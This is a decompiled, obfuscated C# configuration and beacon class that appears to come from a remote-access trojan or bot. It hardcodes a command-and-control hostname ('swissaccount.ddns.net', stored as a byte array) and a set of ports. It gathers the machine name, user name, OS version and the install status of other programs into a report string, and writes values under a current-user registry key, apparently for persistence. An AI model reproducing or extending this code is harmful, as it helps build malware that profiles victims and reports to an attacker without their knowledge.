using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

internal static class Class6
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static byte[] byte_0;

	public static int int_0;

	public static int[] int_1;

	public static string string_10;

	public static string string_11;

	public static string string_12;

	public static string string_13;

	public static string string_14;

	public static string string_15;

	public static string string_16;

	public static string string_17;

	public static string string_18;

	public static string string_19;

	static Class6()
	{
		string_0 = Class11.smethod_0(-2094344284);
		string_1 = Application.get_ExecutablePath();
		char[] separator = new char[1] { '|' };
		string_2 = Class11.smethod_0(-2094344216).Split(separator)[0];
		separator = new char[1] { '|' };
		string_3 = Class11.smethod_0(-2094344205).Split(separator)[0];
		separator = new char[1] { '|' };
		string_4 = Class11.smethod_0(-2094344443).Split(separator)[0];
		separator = new char[1] { '|' };
		string_5 = Class11.smethod_0(-2094344402).Split(separator)[0];
		separator = new char[1] { '|' };
		string_6 = Class11.smethod_0(-2094344397).Split(separator)[0];
		separator = new char[1] { '|' };
		string_7 = Class11.smethod_0(-2094344359).Split(separator)[0];
		string_8 = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
		separator = new char[1] { '|' };
		string_9 = Class11.smethod_0(-2094344350).Split(separator)[0];
		byte_0 = new byte[26]
		{
			115, 119, 105, 115, 115, 97, 99, 99, 111, 117,
			110, 116, 46, 100, 100, 110, 115, 46, 110, 101,
			116, 0, 0, 0, 0, 0
		};
		int_0 = 10019;
		int_1 = new int[5] { 10019, 57000, 35010, 47834, 33009 };
		string_11 = string.Empty;
		string_12 = string.Empty;
		string_13 = string.Empty;
		string_14 = string.Empty;
		separator = new char[1] { '|' };
		string_15 = Class11.smethod_0(-2094344329).Split(separator)[0];
		separator = new char[1] { '|' };
		string_16 = Class11.smethod_0(-2094344452).Split(separator)[0];
		separator = new char[1] { '|' };
		string_17 = Class11.smethod_0(-2094344703).Split(separator)[0];
		separator = new char[1] { '|' };
		string_18 = Class11.smethod_0(-2094344664).Split(separator)[0];
		separator = new char[1] { '|' };
		string_19 = Class11.smethod_0(-2094344643).Split(separator)[0];
	}

	public static byte[] smethod_0(string string_20)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(string_20);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static byte[] smethod_1()
	{
		try
		{
			string empty = string.Empty;
			char[] separator = new char[1] { '|' };
			string text = Class11.smethod_0(-2094344636).Split(separator)[0];
			separator = new char[1] { '!' };
			string text2 = Class11.smethod_0(-2094344593).Split(separator)[0];
			string[] array = new string[10];
			separator = new char[1] { '!' };
			array[0] = Class11.smethod_0(-2094344589).Split(separator)[0];
			array[1] = string_10;
			separator = new char[1] { '!' };
			array[2] = Class11.smethod_0(-2094344816).Split(separator)[0];
			array[3] = string_8;
			separator = new char[1] { '!' };
			array[4] = Class11.smethod_0(-2094344774).Split(separator)[0];
			array[5] = smethod_2();
			separator = new char[1] { '!' };
			array[6] = Class11.smethod_0(-2094344756).Split(separator)[0];
			separator = new char[1] { '!' };
			array[7] = Class11.smethod_0(-2094344726).Split(separator)[0];
			array[8] = string_9;
			separator = new char[1] { '|' };
			array[9] = Class11.smethod_0(-2094343391).Split(separator)[0];
			empty = string.Concat(array);
			string text3 = smethod_5();
			string text4 = string_7;
			separator = new char[1] { '!' };
			if (!File.Exists(text3 + text4 + Class11.smethod_0(-2094343416).Split(separator)[0]))
			{
				separator = new char[1] { '!' };
				text = Class11.smethod_0(-2094344720).Split(separator)[0];
				separator = new char[1] { '!' };
				text2 = Class11.smethod_0(-2094344933).Split(separator)[0];
			}
			else
			{
				string text5 = smethod_5();
				string text6 = string_7;
				separator = new char[1] { '!' };
				text = FileVersionInfo.GetVersionInfo(text5 + text6 + Class11.smethod_0(-2094343416).Split(separator)[0]).ProductVersion;
				if (Process.GetProcessesByName(string_7).Length != 0)
				{
					separator = new char[1] { '!' };
					text2 = Class11.smethod_0(-2094344922).Split(separator)[0];
				}
				else
				{
					separator = new char[1] { '!' };
					text2 = Class11.smethod_0(-2094344888).Split(separator)[0];
				}
			}
			array = new string[12]
			{
				empty, null, null, null, null, null, null, null, null, null,
				null, null
			};
			separator = new char[1] { '!' };
			array[1] = Class11.smethod_0(-2094344874).Split(separator)[0];
			array[2] = text2;
			separator = new char[1] { '!' };
			array[3] = Class11.smethod_0(-2094344840).Split(separator)[0];
			array[4] = text;
			separator = new char[1] { '!' };
			array[5] = Class11.smethod_0(-2094344816).Split(separator)[0];
			array[6] = string_7;
			separator = new char[1] { '!' };
			array[7] = Class11.smethod_0(-2094344774).Split(separator)[0];
			array[8] = smethod_5();
			separator = new char[1] { '!' };
			array[9] = Class11.smethod_0(-2094345075).Split(separator)[0];
			array[10] = string_7;
			separator = new char[1] { '|' };
			array[11] = Class11.smethod_0(-2094343391).Split(separator)[0];
			empty = string.Concat(array);
			string text7 = smethod_3();
			string text8 = string_5;
			separator = new char[1] { '!' };
			if (!File.Exists(text7 + text8 + Class11.smethod_0(-2094343416).Split(separator)[0]))
			{
				separator = new char[1] { '!' };
				text = Class11.smethod_0(-2094344720).Split(separator)[0];
				separator = new char[1] { '!' };
				text2 = Class11.smethod_0(-2094344933).Split(separator)[0];
			}
			else
			{
				string text9 = smethod_3();
				string text10 = string_5;
				separator = new char[1] { '!' };
				text = FileVersionInfo.GetVersionInfo(text9 + text10 + Class11.smethod_0(-2094343416).Split(separator)[0]).ProductVersion;
				separator = new char[1] { '!' };
				text2 = Class11.smethod_0(-2094345046).Split(separator)[0];
			}
			array = new string[12]
			{
				empty, null, null, null, null, null, null, null, null, null,
				null, null
			};
			separator = new char[1] { '!' };
			array[1] = Class11.smethod_0(-2094345027).Split(separator)[0];
			array[2] = text2;
			separator = new char[1] { '!' };
			array[3] = Class11.smethod_0(-2094344840).Split(separator)[0];
			array[4] = text;
			separator = new char[1] { '!' };
			array[5] = Class11.smethod_0(-2094344816).Split(separator)[0];
			array[6] = string_5;
			separator = new char[1] { '!' };
			array[7] = Class11.smethod_0(-2094344774).Split(separator)[0];
			array[8] = smethod_3();
			separator = new char[1] { '!' };
			array[9] = Class11.smethod_0(-2094345075).Split(separator)[0];
			array[10] = string_5;
			separator = new char[1] { '|' };
			array[11] = Class11.smethod_0(-2094343391).Split(separator)[0];
			empty = string.Concat(array);
			string text11 = smethod_8();
			string text12 = string_18;
			separator = new char[1] { '!' };
			if (!File.Exists(text11 + text12 + Class11.smethod_0(-2094343416).Split(separator)[0]))
			{
				separator = new char[1] { '!' };
				text = Class11.smethod_0(-2094344720).Split(separator)[0];
				separator = new char[1] { '!' };
				text2 = Class11.smethod_0(-2094344933).Split(separator)[0];
			}
			else
			{
				string text13 = smethod_8();
				string text14 = string_18;
				separator = new char[1] { '!' };
				text = FileVersionInfo.GetVersionInfo(text13 + text14 + Class11.smethod_0(-2094343416).Split(separator)[0]).ProductVersion;
				if (Process.GetProcessesByName(string_18).Length != 0)
				{
					separator = new char[1] { '!' };
					text2 = Class11.smethod_0(-2094344922).Split(separator)[0];
				}
				else
				{
					separator = new char[1] { '!' };
					text2 = Class11.smethod_0(-2094344888).Split(separator)[0];
				}
			}
			array = new string[14]
			{
				empty, null, null, null, null, null, null, null, null, null,
				null, null, null, null
			};
			separator = new char[1] { '!' };
			array[1] = Class11.smethod_0(-2094345017).Split(separator)[0];
			array[2] = text2;
			separator = new char[1] { '!' };
			array[3] = Class11.smethod_0(-2094344840).Split(separator)[0];
			array[4] = text;
			separator = new char[1] { '!' };
			array[5] = Class11.smethod_0(-2094344816).Split(separator)[0];
			array[6] = string_18;
			separator = new char[1] { '!' };
			array[7] = Class11.smethod_0(-2094344774).Split(separator)[0];
			array[8] = smethod_8();
			separator = new char[1] { '!' };
			array[9] = Class11.smethod_0(-2094345075).Split(separator)[0];
			array[10] = string_18;
			separator = new char[1] { '!' };
			array[11] = Class11.smethod_0(-2094344983).Split(separator)[0];
			array[12] = string_4;
			separator = new char[1] { '|' };
			array[13] = Class11.smethod_0(-2094343391).Split(separator)[0];
			empty = string.Concat(array);
			return smethod_0(empty);
		}
		catch
		{
			return null;
		}
	}

	public static string smethod_2()
	{
		return Path.GetDirectoryName(string_1) + Class11.smethod_0(-2094344975);
	}

	public static string smethod_3()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_19;
	}

	public static void smethod_4()
	{
		char[] separator = new char[1] { '!' };
		string_10 = Class11.smethod_0(-2094345207).Split(separator)[0];
		string_11 = Environment.MachineName;
		string_12 = Environment.UserName;
	}

	public static string smethod_5()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_17;
	}

	public static string smethod_6()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			string text = oSVersion.Version.Major.ToString();
			return string.Concat(str2: oSVersion.Version.Minor.ToString(), str0: text, str1: Class11.smethod_0(-2094345347));
		}
		catch
		{
			char[] separator = new char[1] { '!' };
			return Class11.smethod_0(-2094345200).Split(separator)[0];
		}
	}

	public static void smethod_7(string string_20, string string_21)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			char[] separator = new char[1] { '|' };
			RegistryKey registryKey = currentUser.OpenSubKey(Class11.smethod_0(-2094345177).Split(separator)[0], writable: true);
			object value = registryKey.GetValue(string_9 + string_20);
			if (value == null || value.ToString() != string_21)
			{
				registryKey.SetValue(string_9 + string_20, string_21);
			}
		}
		catch
		{
		}
	}

	public static string smethod_8()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_2;
	}
}
